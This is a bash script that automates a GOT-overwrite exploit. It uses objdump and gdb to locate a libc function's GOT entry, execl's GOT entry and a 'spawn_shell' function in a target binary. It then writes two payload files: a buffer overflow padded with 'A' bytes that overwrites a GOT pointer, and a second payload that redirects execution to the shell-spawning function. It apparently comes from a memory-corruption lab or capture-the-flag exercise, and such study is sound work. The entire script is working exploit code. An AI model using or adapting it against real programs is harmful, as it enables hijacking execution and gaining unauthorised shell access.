#!/bin/bash

# Construct payloads

usage="Usage: $0 <executable> <library-fn-name> <item-buffer-bound>"
grepnc="grep --color=never"

# Check number of parameters
if [[ "$#" -ne 3 ]]; then
        echo $usage
        exit 1
fi

binname=$1
libfn=$2
bufbound=$3
dat1="data1.dat"
dat2="data2.dat"
execfn="execl"
spawnfn="spawn_shell"

# Find address of libc library function to be overwritten
libaddrline=(`objdump --dynamic-reloc $binname | $grepnc $libfn`)
echo "Address of $libfn@got.plt: 0x$libaddrline"

# Find address of execl
execaddrline=(`objdump --dynamic-reloc $binname | $grepnc $execfn`)
distance=$((0x$execaddrline - 0x$libaddrline))
echo "Offset to $execfn@got.plt: $distance"
let distance=$(($distance / 8))

# Find table entry of execl
echo -n "x/2gx 0x$execaddrline" > comms1
execloc=(`gdb $binname < comms1 | $grepnc "<$execfn@got\.plt>"`)
execloc=(`echo ${execloc[3]} | cut -f2 -d "x"`)
echo "Location of $execfn@got.plt: 0x$execloc"

# Find address of shell-spawning function
echo -n "p $spawnfn" > comms2
spawnaddrline=(`gdb $binname < comms2 | $grepnc "0x[0-9a-fA-F]\{6,8\}"`)
salindex=0
for i in "${!spawnaddrline[@]}"; do
	if [[ ${spawnaddrline[$i]} == "<$spawnfn>" ]]; then
		let salindex="$i-1"
	fi
done
spawnaddr=(`echo ${spawnaddrline[$salindex]} | tr 'x' '0'`)
echo "Address of spawn_shell(): $spawnaddr"

# Write first payload file
if [ -f $dat1 ]; then rm $dat1; fi
for i in $(seq 0 "$bufbound"); do echo -n -e \\x41 >> $dat1; done
for ((i=7;i>=0;i--)); do echo -n -e \\x${libaddrline:2*i:2} >> $dat1; done

# Write second payload file
if [ -f $dat2 ]; then rm $dat2; fi
for ((i=3;i>=0;i--)); do echo -n -e \\x${spawnaddr:2*i:2} >> $dat2; done
for i in {0..3}; do echo -n -e \\x00 >> $dat2; done
for i in $(seq 1 "$distance"); do
	for ((i=7;i>=0;i--)); do echo -n -e \\x${execloc:2*i:2} >> $dat2; done
done;

# Clean up
if [ -f comms1 ]; then rm comms1; fi
if [ -f comms2 ]; then rm comms2; fi
